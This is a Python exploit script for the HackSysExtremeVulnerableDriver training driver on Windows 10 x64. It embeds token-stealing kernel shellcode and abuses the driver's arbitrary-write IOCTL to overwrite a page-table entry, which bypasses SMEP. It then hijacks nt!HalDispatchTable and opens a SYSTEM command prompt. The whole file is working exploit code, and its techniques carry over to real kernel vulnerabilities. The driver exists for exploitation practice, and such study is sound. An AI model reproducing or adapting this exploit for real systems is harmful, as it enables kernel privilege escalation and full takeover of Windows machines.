# Refer to https://connormcgarr.github.io/pte-overwrites/ with python 3 version
# Tested on Windows 10 x64 RS1 (Version 1607)

import struct
import sys
import os

from ctypes import *
from ctypes.wintypes import *

class WriteWhatWhere_PTE_Base(Structure):
  _fields_ = [
    ("What_PTE_Base", c_void_p),
    ("Where_PTE_Base", c_void_p),
  ]

class WriteWhatWhere_PTE_Control_Bits(Structure):
  _fields_ = [
    ("What_PTE_Control_Bits", c_void_p),
    ("Where_PTE_Control_Bits", c_void_p),
  ]

class WriteWhatWhere_PTE_Overwrite(Structure):
  _fields_ = [
    ("What_PTE_Overwrite", c_void_p),
    ("Where_PTE_Overwrite", c_void_p),
  ]

class WriteWhatWhere(Structure):
  _fields_ = [
    ("What", c_void_p),
    ("Where", c_void_p),
  ]

# Debug error via GetLastError()
def errcheck_bool(res, func, args):
    le = gle() # GetLastError()

    if not res and le != 0x1f: 
        raise Exception("{} failed. GLE: {}".format(func.__name__, le))

    return res

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Create memory allocation for token stealing shellcode
payload = bytearray(
    b"\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
    b"\x48\x8B\x80\xB8\x00\x00\x00"                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
    b"\x48\x89\xC3"                                      # mov rbx,rax         ; Copy current process to rbx
    b"\x48\x8B\x9B\xF0\x02\x00\x00"                      # mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
    b"\x48\x81\xEB\xF0\x02\x00\x00"                      # sub rbx,0x2f0       ; Go back to current process
    b"\x48\x8B\x8B\xE8\x02\x00\x00"                      # mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
    b"\x48\x83\xF9\x04"                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
    b"\x75\xE5"                                          # jnz 0x13            ; Loop until SYSTEM PID is found
    b"\x48\x8B\x8B\x58\x03\x00\x00"                      # mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x358
    b"\x80\xE1\xF0"                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
    b"\x48\x89\x88\x58\x03\x00\x00"                      # mov [rax+0x358],rcx ; Copy SYSTEM token to current process
    b"\x48\x31\xC0"                                      # xor rax,rax         ; set NTSTATUS SUCCESS
    b"\xC3"                                              # ret                 ; Done!
)

print("[+] Allocating RWX region for shellcode")

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = c_void_p
ptr = VirtualAlloc(
  c_int(0),
  c_int(len(payload)),
  c_int(0x3000),
  c_int(0x40),
)

c_type_buffer = (c_char * len(payload)).from_buffer(payload)

print("[+] Copying shellcode to newly allocated RWX region")

RtlMoveMemory = kernel32.RtlMoveMemory
kernel32.RtlMoveMemory(
  c_void_p(ptr),
  c_type_buffer,
  c_int(len(payload))
)
shellcode_pointer = c_void_p(ptr)

print(f"[+] Shellcode is located at {hex(ptr)}")

print("[+] Calling EnumDeviceDrivers()...")

# Get ntoskrnl base address
base = (c_ulonglong * 1024)()
get_drivers = psapi.EnumDeviceDrivers(
  byref(base),
  sizeof(base),
  byref(c_long())
)

kernel_address = base[0]
print(f"[+] ntoskrnl.exe base address: {hex(kernel_address)}")

# Get nt!MiGetPteAddress base address
nt_mi_get_pte_address = kernel_address + 0x51214 # Offset is different on your machine
print(f"[+] nt!MiGetPteAddress address: {hex(nt_mi_get_pte_address)}")

pte_base = nt_mi_get_pte_address + 0x13
print(f"[+] nt!MiGetPteAddress+0x13 address: {hex(pte_base)}")

# Write pte_base address into its pointer
base_of_ptes_pointer = c_void_p() 
www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)

handle = kernel32.CreateFileA(
    b"\\\\.\\HackSysExtremeVulnerableDriver",
    0xC0000000,
    0,
    None,
    0x3,
    0,
    None
)

if not handle:
  print("[+] HEVD Driver not found")
  sys.exit(-1)

else:
  print("[+] HEVD Driver connected")

gle = windll.kernel32.GetLastError
kernel32.DeviceIoControl.restype = BOOL
kernel32.DeviceIoControl.errcheck = errcheck_bool

# 0x22200B = IOCTL to TriggerArbitraryOverwrite()
status = kernel32.DeviceIoControl(
  handle,
  0x0022200B,
  www_pte_pointer,
  0x8,
  None,
  0,
  byref(c_ulong()),
  None
)

if not status:
  print("[-] DeviceIoControl Failed")
  sys.exit(-1)

base_of_ptes = struct.unpack("<Q", base_of_ptes_pointer)[0] # CTypes way of extracting value from a C void pointer
print(f"[+] Base of PTEs are located at: {hex(base_of_ptes)}")

# Calculate PTE for shellcode memory page
shellcode_pte = ptr >> 9
shellcode_pte &= 0x7ffffffff8
shellcode_pte += base_of_ptes

print(f"[+] shellcode_pte address: {hex(shellcode_pte)}")

# Write shellcode_pte into its pointer
shellcode_pte_bits_pointer = c_void_p()
www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
www_pte_bits.What_PTE_Control_Bits = shellcode_pte
www_pte_bits.Where_PTE_Control_Bits = addressof(shellcode_pte_bits_pointer)
www_pte_bits_pointer = pointer(www_pte_bits)

kernel32.DeviceIoControl(
  handle,
  0x22200B,
  www_pte_bits_pointer,
  0x8,
  None,
  0,
  byref(c_ulong()),
  None
)

# Overwrite pte of user mode to kernel mode
shellcode_pte_control_bits_usermode = struct.unpack("<Q", shellcode_pte_bits_pointer)[0] # CTypes way of extracting value from a C void pointer
shellcode_pte_control_bits_kernelmode = shellcode_pte_control_bits_usermode - 4

# Overwrite address of shellcode_pte with kernel mode pte
pte_overwrite_pointer = c_void_p(shellcode_pte_control_bits_kernelmode)
www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
www_pte_overwrite.Where_PTE_Overwrite = shellcode_pte
www_pte_overwrite_pointer = pointer(www_pte_overwrite)

print("[+] Overwrite shellcode PTE to supervisor control")

kernel32.DeviceIoControl(
  handle,
  0x22200B,
  www_pte_overwrite_pointer,
  0x8,
  None,
  0,
  byref(c_ulong()),
  None
)

# Get nt!HalDispatchTable address for shellcode execution 
haldispatchtable_base_address = kernel_address + 0x2f1330 # Offset is different on your machine
haldispatchtable = haldispatchtable_base_address + 0x8
print(f"[+] nt!HalDispatchTable+0x8: {hex(haldispatchtable)}")

# Overwrite nt!HalDispatchTable+0x8 with shellcode entry point
www = WriteWhatWhere()
www.What = addressof(shellcode_pointer)
www.Where = haldispatchtable
www_pointer = pointer(www)

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Execute shellcode
ntdll.NtQueryIntervalProfile(
  0x1234,
  byref(c_ulonglong())
)

print("[+] Run new cmd.exe with SYSTEM privilege")
# Execute cmd.exe with SYSTEM privilege
os.system("cmd.exe /K cd C:\\")